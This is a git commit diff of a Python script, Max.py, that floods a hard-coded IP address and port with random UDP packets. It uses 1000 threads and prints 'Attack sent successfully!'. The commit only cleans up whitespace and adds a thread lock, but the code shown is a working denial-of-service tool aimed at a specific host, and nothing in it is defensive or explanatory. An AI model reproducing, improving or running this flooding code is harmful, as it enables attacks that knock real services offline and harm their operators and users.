fa1b58a66961e26c0ff73d7b494232399a9b342a
devhub910 <hysyhuq@gmail.com>
2024-08-19 17:12:33 +0300

    Update Max.py

--- Max.py
+++ Max.py
@@ -6,28 +6,30 @@ from colorama import Fore, init
 
 init(autoreset=True)
 
-UDP_IP = "185.107.192.21" 
-UDP_PORT = 51814  
+UDP_IP = "185.107.192.21"
+UDP_PORT = 51814
 THREAD_COUNT = 1000
-MESSAGE_SENT = False
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+message_sent_lock = threading.Lock()
+message_sent = False
 
 def generate_random_data(size):
     return bytes(random.getrandbits(8) for _ in range(size))
 
 def send_packets():
-    global MESSAGE_SENT
+    global message_sent
     try:
         while True:
-            message = generate_random_data(1024)  
+            message = generate_random_data(1024)
             sock.sendto(message, (UDP_IP, UDP_PORT))
-            if not MESSAGE_SENT:
-                print(Fore.LIGHTGREEN_EX + "[!] Attack sent successfully!")  
-                MESSAGE_SENT = True
-            time.sleep(0.1)  
+            with message_sent_lock:
+                if not message_sent:
+                    print(Fore.LIGHTGREEN_EX + "[!] Attack sent successfully!")
+                    message_sent = True
+            time.sleep(0.1)
     except KeyboardInterrupt:
-        print(Fore.YELLOW + "Stopped by user") 
+        print(Fore.YELLOW + "Stopped by user")
     except Exception as e:
         print(Fore.RED + f"Error: {e}")
 
